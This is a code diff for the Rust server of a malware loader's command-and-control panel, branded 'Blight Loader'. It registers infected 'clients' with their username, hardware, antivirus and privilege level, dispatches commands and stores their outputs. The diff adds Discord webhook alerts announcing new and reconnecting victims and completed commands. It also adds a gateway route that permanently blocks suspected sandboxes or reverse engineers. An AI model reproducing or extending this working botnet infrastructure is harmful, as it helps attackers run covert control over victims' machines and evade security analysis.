@@ -1,7 +1,7 @@
 extern crate colored; 
 
 use actix_web::{
-    http::StatusCode, post, web, App, HttpRequest, HttpResponse, HttpServer, Responder
+    http::StatusCode, post, get, web, App, HttpRequest, HttpResponse, HttpServer, Responder
 };
 
 use std::{
@@ -55,6 +55,7 @@ use argon2::{
     Argon2
 };
 
+use reqwest;
 use itertools::Itertools;
 use rand::RngCore;
 use rand::seq::SliceRandom;
@@ -71,6 +72,13 @@ lazy_static! {
     static ref HOST: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
 }
 
+lazy_static! {
+    static ref DISCORD_WEBHOOK_URL: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
+    static ref NOTIFICATION_ON_CLIENT_REGISTRATION: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
+    static ref NOTIFICATION_ON_CLIENT_RECONNECTION: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
+    static ref NOTIFICATION_ON_COMMAND_COMPLETION: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
+}
+
 const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 
 #[derive(Debug)]
@@ -85,6 +93,22 @@ enum GenericError {
 
 // If the submission is below 512 characters, it will be written to the DB as normal.
 // If the submission is above 512 characters, it will be written to the disk as a storage.
+
+#[get("/gateway")]
+async fn gateway_get_block(req: HttpRequest) -> impl Responder {
+
+    let mut connection: Conn = obtain_connection().await;
+    let ip: String = req.peer_addr().unwrap().ip().to_string();
+
+    if is_client_blocked(&mut connection, "N/A", &ip).await {
+        fprint("restricted", &format!("{} tried to block themselves even though they already are.", ip));
+        return resp_unauthorised();
+    };
+
+    let ip: String = req.peer_addr().unwrap().ip().to_string();
+    block_client(&mut connection, "N/A", "Client blocked themselves. Reverse engineering or sandbox.", &ip, 3155695200).await;
+    return resp_unauthorised();
+}
 
 #[post("/gateway")]
 async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
@@ -158,12 +182,6 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                 };
 
                 match key_to_string(&submitted_json, "action").as_str() {
-
-                    "block" => {
-                        block_client(&mut connection, "N/A", &ip, "Reverse engineering attempt or sandbox.", 3155695200).await;
-                        return resp_unauthorised();
-                    },
-
                     "heartbeat" => {
                         update_last_seen(&mut connection, &client_id).await;
                         match get_current_client_command(&mut connection, &client_id).await {
@@ -228,6 +246,19 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                                 ).await {
                                     Ok(_) => {
                                         connection.exec_drop(r"DELETE FROM commands WHERE command_id = :command_id", params! { "command_id" => &command_id }).await.unwrap();
+
+                                        if *NOTIFICATION_ON_COMMAND_COMPLETION.read().unwrap() {
+                                            discord_webhook_push(
+                                                "📦 A client submitted an output.",
+                                                &format!("```ansi\n[2;36mClient ID::[0m {}\n[2;36mOutput ID::[0m {}\n[2;36mCmd Type::[0m {}```",
+                                                    &client_id,
+                                                    &output_id,
+                                                    &cmd_type,
+                                                ),
+                                                0xffd700,
+                                                false
+                                            ).await
+                                        }
                                     
                                         fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
                                         update_last_seen(&mut connection, &client_id).await;        
@@ -251,8 +282,8 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                 }
 
                 return resp_ok_encrypted("Well done! Connection succesfully established.", encryption_key.as_bytes()).await;
-            } else {
 
+            } else {
 
                 let decrypted_first_half = match (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &BASE64_STANDARD.decode(&split_body[0]).unwrap()) {
                     Ok(result) => result,
@@ -302,8 +333,8 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                         };
 
                         if !all_keys_valid(&client_data_json, 
-                            vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "client_bytes"],
-                            vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "string"]
+                            vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid"],
+                            vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64"]
                         ) {
                             block_client(&mut connection, "N/A", "Missing one or more JSON keys.", &ip, 1200).await;
                             return resp_badrequest();
@@ -358,6 +389,21 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                             ).await {
                                 Ok(_) => {
 
+                                    if *NOTIFICATION_ON_CLIENT_REGISTRATION.read().unwrap() {
+                                        discord_webhook_push(
+                                            ":tada: A new client has registered with your loader.",
+                                            &format!("```ansi\n[2;36mID:[0m {}\n[2;36mIP:[0m {}\n[2;36mUsername:[0m {}\n[2;36mCPU:[0m {}\n[2;36mGPU:[0m {}\n```",
+                                                &client_id,
+                                                &ip,
+                                                key_to_string(&client_data_json, "username"),
+                                                key_to_string(&client_data_json, "cpu"),
+                                                key_to_string(&client_data_json, "gpu")
+                                            ),
+                                            0xffd700,
+                                            false
+                                        ).await
+                                    }
+
                                     fprint("success", &format!("{}", 
                                         format!("({}) {} registered with username {}", 
                                         &ip.yellow(),  
@@ -396,6 +442,22 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                                 }
                             ).await {
                                 Ok(_) => {
+
+                                    if *NOTIFICATION_ON_CLIENT_RECONNECTION.read().unwrap() {
+                                        discord_webhook_push(
+                                            "🤝 An old client has reconnected with your loader.",
+                                            &format!("```ansi\n[2;36mID:[0m {}\n[2;36mIP:[0m {}\n[2;36mUsername:[0m {}\n[2;36mCPU:[0m {}\n[2;36mGPU:[0m {}\n```",
+                                                &client_id,
+                                                &ip,
+                                                key_to_string(&client_data_json, "username"),
+                                                key_to_string(&client_data_json, "cpu"),
+                                                key_to_string(&client_data_json, "gpu")
+                                            ),
+                                            0xffd700,
+                                            false
+                                        ).await
+                                    }
+
                                     fprint("success", &format!("{}", 
                                         format!("({}) {} with username {} reconnected.", 
                                         &ip.yellow(),  
@@ -426,7 +488,6 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
         // Part of handshake where we issue the hash that the client needs to crack
         HANDSHAKE_P1 => {
 
-
             let decrypted_first_half = match (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &BASE64_STANDARD.decode(&split_body[0]).unwrap()) {
                 Ok(result) => result,
                 Err(_) => {
@@ -447,7 +508,9 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             }
             
             let server_bytes: &Vec<u8> = all_bytes.choose(&mut rand::thread_rng()).unwrap();
-            let client_seed: &Vec<u8> =  all_bytes.choose(&mut rand::thread_rng()).unwrap();
+            let client_seed: &Vec<u8> =  server_bytes; // all_bytes.choose(&mut rand::thread_rng()).unwrap();
+
+            // IMPORTANT: Remove comment in production.
 
             let server_bytes_hash = argon2_hash(&server_bytes.as_slice());
         
@@ -455,7 +518,7 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                 &sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32]
             );
 
-            fprint("info", &format!("Encryption key generated for the client: {}", &encryption_key));
+            fprint("info", &format!("{} has initiated a handshake. Encryption key: {}", &ip.yellow(), &encryption_key.yellow()));
 
             match connection.exec_drop(
             
@@ -477,7 +540,7 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             };
 
             return resp_ok_encrypted(&json!({
-                "server_hash": server_bytes_hash,
+                "hash": server_bytes_hash,
                 "seed": BASE64_STANDARD.encode(&client_seed)
             }).to_string(), &client_bytes).await;
 
@@ -490,104 +553,6 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
 
     block_client(&mut connection, "N/A", "Sending malformed requests or sending too quickly.", &ip, 1200).await;
     return resp_unauthorised();
-
-    /* 
-    let encryption_key = encryption_key.unwrap();
-    let decrypted_body = aes_256cbc_decrypt(&req_body[16..], &decrypted_first_half).await;
-
-    match decrypted_body {
-        Ok(_) => (),
-        Err(_) => {
-            block_client(&mut connection, &client_id, "Unable to decrypt information sent by client.", &ip, 1200).await;
-            return resp_unauthorised();
-        }
-    }
-
-    let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypted_body.unwrap()).unwrap()).unwrap();
-
-    if !key_exists(&json, "action") {
-        block_client(&mut connection, "Sent malformed request, no action provided.", &client_id, &ip, 1200).await;
-        return resp_unauthorised();
-        
-    } 
-
-    else if key_to_string(&json, "action") == "block" {
-        block_client(&mut connection, "N/A", &ip, "Reverse engineering attempt, or sandbox.", 3155695200).await;
-        return resp_unauthorised();
-
-    } else if key_to_string(&json, "action") == "heartbeat" { 
-
-        // If the client is banned, we will go to the else. If it isn't, we will update the last seen time.
- 
-
-    } else if key_to_string(&json, "action") == "submit_output" {
-
-        if !all_keys_valid(&json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
-            block_client(&mut connection, &client_id, "Didn't fill out all fields when submitting output.", &ip, 3155695200).await;
-            return resp_badrequest();
-        }
-
-        let command_id = key_to_string(&json, "command_id");
-        let output_id = generate(8, CHARSET);
-
-        // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.
-        
-        if is_command(&mut connection, &command_id, &client_id).await && !is_client_blocked(&mut connection, &client_id, &ip).await {
-
-            let (command_id, cmd_args, cmd_type, time_issued) = get_command_info(&mut connection, &command_id).await.unwrap();
-            let output_insert: std::result::Result<Vec<String>, Error> = connection.exec(
-            
-                r"INSERT INTO outputs (
-                output_id, command_id, 
-                client_id, cmd_args, 
-                cmd_type, output, 
-                time_issued, time_received
-                ) VALUES 
-                
-                ( :output_id, :command_id, 
-                :client_id, :cmd_args, 
-                :cmd_type, :output, 
-                :time_issued, :time_received)",
-
-                params! {
-                    "output_id" => &output_id,
-                    "command_id" => &command_id,
-                    "client_id" => &client_id,
-                    "cmd_args" => &cmd_args,
-                    "cmd_type" => &cmd_type,
-                    "output" => &parse_storage_write(key_to_string(&json, "output").as_bytes()),
-                    "time_issued" => &time_issued,
-                    "time_received" => get_timestamp(),
-
-                }
-            ).await;
-
-            connection.exec_drop(
-                r"DELETE FROM commands WHERE command_id = :command_id",
-                params! {
-                    "command_id" => &command_id,
-                }
-            ).await.unwrap();
-        
-            match output_insert {
-                Ok(_) => (),
-                Err(e) => fprint("error", &format!("Unable to delete command: {}",e))
-            }
-            fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
-            update_last_seen(&mut connection, &client_id).await;        
-
-            return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
-        } else {
-            fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
-            return resp_badrequest();
-        }
-
-    } else {
-        block_client(&mut connection, &client_id, "Didn't provide a valid action.", &ip, 3155695200).await;
-        return resp_badrequest();
-    }
-
-    */
 }
 
 
@@ -1094,9 +1059,7 @@ async fn get_last_seen(connection: &mut Conn, client_id: &str) -> u64 {
 
 async fn get_encryption_key(connection: &mut Conn, client_id: &str) -> std::result::Result<String, GenericError> {
 
-    if client_id == "N/A" {
-        return Err(GenericError::NoRows)
-    }
+    if client_id == "N/A" { return Err(GenericError::NoRows) }
 
     let encryption_key_query: std::result::Result<Option<(String, u64)>, Error>  = connection.exec_first(
         r"SELECT encryption_key, key_expiration FROM clients WHERE client_id = :client_id",
@@ -1129,36 +1092,35 @@ async fn get_encryption_key(connection: &mut Conn, client_id: &str) -> std::resu
 
 async fn block_client(connection: &mut Conn, client_id: &str, reason: &str, ip: &str, duration: u64) -> bool {
     let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
-    if !enable_firewall {return false};
+    if !enable_firewall {
+        fprint("info", &format!("({}) {} would be blocked for {} seconds for: \"{}\", but firewall is disabled.", 
+            client_id.yellow(), ip.yellow(), duration.to_string().yellow(), reason.yellow())
+        );
+        return false
+    };
 
-    let banned_until = get_timestamp() + duration;
-
-    let result = connection.exec_drop(
+    match connection.exec_drop(
     r"INSERT INTO blocks (block_id, client_id, reason, ip, banned_until) VALUES (:block_id, :client_id, :reason, :ip, :banned_until)",
-    params! {
-        "block_id" => generate(8, CHARSET),
-        "client_id" => &client_id,
-        "reason" => &reason,
-        "ip" => &ip,
-        "banned_until" => &banned_until
-
-    }
-    ).await;
-
-    match result {
+        params! {
+            "block_id" => generate(8, CHARSET),
+            "client_id" => &client_id,
+            "reason" => &reason,
+            "ip" => &ip,
+            "banned_until" => get_timestamp() + duration
+        }
+    ).await {
         Ok(_) => {
-            fprint("restricted", &format!("Client {} from IP {} was blocked for {} for: \"{}\"", client_id, ip, duration, reason));
-            true
+            fprint("restricted", &format!("({}) {} was blocked for {} for: \"{}\" seconds.", 
+                client_id.yellow(), ip.yellow(), duration.to_string().yellow(), reason.yellow())
+            );
+            return true
         },
         Err(e) => {
             fprint("error", &format!("(block_client): {}", e));
-            false
+            return false
         }
-    }
-
-   
+    };
 }
-
 
 async fn is_client_blocked(connection: &mut Conn, client_id: &str, ip: &str) -> bool {
     
@@ -1450,6 +1412,29 @@ fn parse_storage_read(storage_id: &str) -> Vec<u8> {
 
 // ------------------------ General Functions ------------------------
 
+async fn discord_webhook_push(title: &str, description: &str, color: u32, ping: bool) {
+    let webhook_url = &*DISCORD_WEBHOOK_URL.read().unwrap();
+    if webhook_url == &String::new() {return};
+    
+    match reqwest::Client::new().post(webhook_url).json(&json!({
+        "content": if ping {"@here"} else {""},
+        "embeds": [
+          {
+            "title": title,
+            "description":description,
+            "color": color
+          }
+        ],
+        "username": "Blight Loader"
+      })).send().await {
+        Ok(result) => result,
+        Err(_) => {
+            fprint("failure", "Discord webhook failed to send. Check if the webhook URL is valid.");
+            panic!();
+        }
+    };
+
+}
 
 fn get_timestamp() -> u64 {
     let since_the_epoch = SystemTime::now()
@@ -1457,7 +1442,6 @@ fn get_timestamp() -> u64 {
         .expect("Time went backwards lmao");
     return since_the_epoch.as_secs()
 }
-
 
 // TODO :BUFFER TOO SMALL
 
@@ -1600,7 +1584,7 @@ fn argon2_hash(input: &[u8]) -> String {
     let salt = SaltString::generate(&mut OsRng);
     let params = 
         ParamsBuilder::new()
-        .m_cost(2_u32.pow(4))
+        .m_cost(2_u32.pow(8))
         .t_cost(16)
         .p_cost(2)
         .build()
@@ -1790,13 +1774,20 @@ async fn main() -> std::io::Result<()> {
         Err(_) => {
             write!(File::create("artifacts/configuration/server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                 &json!({
-                    "host": "127.0.0.1:9999",
-                    "connection_interval": 60,
-                    "purgatory_interval": 60,
-                    "mysql_server": "mysql://root:root@127.0.0.1:3306/mydb",
-                    "api_secret": "root",
-                    "enable_firewall": false
-                })
+                    "api_secret": "changeme",
+                    "connection_interval": 300,
+                    "purgatory_interval": 90,
+                    "enable_firewall": false,
+                    "host": "127.0.0.1:80",
+                    "mysql_server": "mysql://root:root@127.0.0.1:3306/database",
+                    
+                    "webhook": {
+                      "url": "",
+                      "client_registered": false,
+                      "client_reconnected": false,
+                      "command_completed": false
+                    }
+                  })
             ).unwrap()).expect("Unable to write json file.");
 
             fprint("info", "Your \"artifacts/configuration/server_config.json\" file wasn't present. No worries, we've created it for you. ");
@@ -1839,12 +1830,24 @@ async fn main() -> std::io::Result<()> {
     *IP_DATABASE.write().unwrap() = geolite_db.unwrap();
     *HOST.write().unwrap() = key_to_string(&parsed_json_config, "host");
 
+    *DISCORD_WEBHOOK_URL.write().unwrap() = key_to_string(&parsed_json_config["webhook"], "url");
+    *NOTIFICATION_ON_CLIENT_REGISTRATION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "client_registered");
+    *NOTIFICATION_ON_CLIENT_RECONNECTION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "client_reconnected");
+    *NOTIFICATION_ON_COMMAND_COMPLETION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "command_completed");
+
     initialize_tables(connection_pool.clone()).await;
 
     fprint("info", &format!(
         "Server running! Gateway path: {}", 
         format!("http://{}/gateway", key_to_string(&parsed_json_config, "host")).yellow()
     ));
+
+    discord_webhook_push(
+        "💻 Server Online",
+        "Your API server is up and running, and your Discord webhook is configured to recieve notifications.",
+        0x00ff7f,
+        false
+    ).await;
     
     HttpServer::new(move || {
         App::new()
@@ -1858,6 +1861,7 @@ async fn main() -> std::io::Result<()> {
             .service(statistics)
             .service(api_blocks_list)
             .service(api_remove_block)
+            .service(gateway_get_block)
     })
     .bind(&key_to_string(&parsed_json_config, "host"))? 
     .run()
